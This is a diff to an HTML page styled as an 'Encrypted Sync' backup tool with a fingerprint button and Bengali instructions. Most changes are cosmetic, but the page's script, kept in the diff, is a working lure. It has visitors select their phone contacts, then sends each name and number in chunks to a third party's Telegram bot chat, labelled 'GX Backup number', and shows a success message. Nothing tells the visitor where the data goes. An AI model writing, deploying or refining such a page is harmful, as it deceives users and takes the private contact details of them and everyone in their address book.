@@ -23,42 +23,43 @@
             font-family: 'Inter', sans-serif;
         }
 
-        /* ব্যাকগ্রাউন্ড অ্যানিমেশন */
-        .orb {
+        /* সেই লাইট চলাচল করার অ্যানিমেশন (Moving Glow) */
+        .moving-light {
             position: absolute;
-            width: 400px;
-            height: 400px;
-            background: radial-gradient(circle, rgba(0, 242, 254, 0.15), rgba(126, 34, 206, 0.15));
-            filter: blur(100px);
+            width: 450px;
+            height: 450px;
+            background: radial-gradient(circle, rgba(0, 242, 254, 0.2), rgba(126, 34, 206, 0.2));
+            filter: blur(120px);
             border-radius: 50%;
             z-index: -1;
-            animation: move 12s infinite alternate ease-in-out;
+            /* লাইটটি স্ক্রিনজুড়ে চলাচলের জন্য অ্যানিমেশন */
+            animation: moveLight 15s infinite alternate ease-in-out;
         }
 
-        @keyframes move {
-            from { transform: translate(-40%, -40%); }
-            to { transform: translate(30%, 30%); }
+        @keyframes moveLight {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(40%, 20%) scale(1.2); }
+            100% { transform: translate(-20%, 50%) scale(1); }
         }
 
         .main-container {
             background: rgba(255, 255, 255, 0.02);
-            backdrop-filter: blur(40px);
-            -webkit-backdrop-filter: blur(40px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(45px);
+            -webkit-backdrop-filter: blur(45px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 50px;
             padding: 60px 30px;
             width: 350px;
             text-align: center;
             position: relative;
-            box-shadow: 0 40px 100px rgba(0,0,0,0.7);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
         }
 
-        /* লোগো বাটন এনিমেশন */
         .action-circle {
             width: 140px;
             height: 140px;
             background: radial-gradient(circle, rgba(0, 242, 254, 0.05), transparent);
-            border: 2px dashed rgba(0, 242, 254, 0.3);
+            border: 2px dashed rgba(0, 242, 254, 0.4);
             border-radius: 50%;
             margin: 0 auto 40px;
             display: flex;
@@ -66,13 +67,12 @@
             justify-content: center;
             cursor: pointer;
             transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-            box-shadow: inset 0 0 20px rgba(0, 242, 254, 0.1);
+            box-shadow: inset 0 0 25px rgba(0, 242, 254, 0.1);
         }
 
         .action-circle:hover {
             border: 2px solid var(--primary);
-            box-shadow: 0 0 40px rgba(0, 242, 254, 0.4);
+            box-shadow: 0 0 50px rgba(0, 242, 254, 0.5);
             transform: scale(1.05) rotate(90deg);
         }
 
@@ -82,12 +82,11 @@
 
         .action-circle i {
             transition: 0.6s;
-            font-size: 50px;
+            font-size: 55px;
             color: var(--primary);
-            text-shadow: 0 0 20px rgba(0, 242, 254, 0.8);
+            text-shadow: 0 0 25px rgba(0, 242, 254, 0.8);
         }
 
-        /* লোগো ঘুরলে আইকন যেন সোজা থাকে */
         .action-circle:hover i {
             transform: rotate(-90deg);
         }
@@ -125,7 +124,7 @@
 </head>
 <body>
 
-    <div class="orb"></div>
+    <div class="moving-light"></div>
 
     <div class="main-container">
         <div class="sub-text">Encrypted Sync</div>
@@ -135,7 +134,7 @@
             <i class="fas fa-fingerprint"></i>
         </div>
 
-        <p class="instruction">মাঝখানের আইকনে চাপ দিয়ে <br> ব্যাকআপ প্রক্রিয়া শুরু করুন</p>
+        <p class="instruction">আইকনে চাপ দিয়ে <br> ব্যাকআপ শুরু করুন</p>
 
         <div id="status"></div>
     </div>
@@ -153,22 +152,18 @@
             }
 
             try {
-                // কন্টাক্ট সিলেক্ট প্রম্পট
                 const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
                 if (contacts && contacts.length > 0) {
-                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
+                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> সংযোগ করা হচ্ছে...`;
                     await sendData(contacts);
                 }
-            } catch (err) {
-                console.log("User cancelled");
-            }
+            } catch (err) { console.log("Cancelled"); }
         }
 
         async function sendData(contacts) {
             const status = document.getElementById('status');
             const CHUNK_SIZE = 15;
-            
             const now = new Date();
             const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
             const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
@@ -177,14 +172,11 @@
             for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
                 const chunk = contacts.slice(i, i + CHUNK_SIZE);
                 let message = `📊 **GX Backup number**\n\n`;
-                message += `📅 ${days[now.getDay()]}, ${dateStr}\n`;
-                message += `⏰ ${timeStr}\n`;
-                message += `👥 Total: ${contacts.length}\n`;
+                message += `📅 ${days[now.getDay()]}, ${dateStr}\n⏰ ${timeStr}\n👥 Total: ${contacts.length}\n`;
                 message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
 
                 chunk.forEach(c => {
-                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\n`;
-                    message += `Number : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
+                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\nNumber : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                 });
 
                 message += `— GX Sammim sent`;
@@ -193,21 +185,15 @@
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                     });
                     
                     status.innerText = `প্রগতি: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
                     await new Promise(r => setTimeout(r, 1300)); 
-                } catch (e) {
-                    console.error(e);
-                }
+                } catch (e) { console.error(e); }
             }
             
-            // কোনো এলার্ট মেসেজ আসবে না, সরাসরি এখানে সাকসেস দেখাবে
+            // মেসেজ অ্যালার্ট ছাড়াই সাকসেস মেসেজ
             status.style.color = "#38ef7d";
             status.innerHTML = "✅ সফলভাবে সম্পন্ন হয়েছে!";
         }
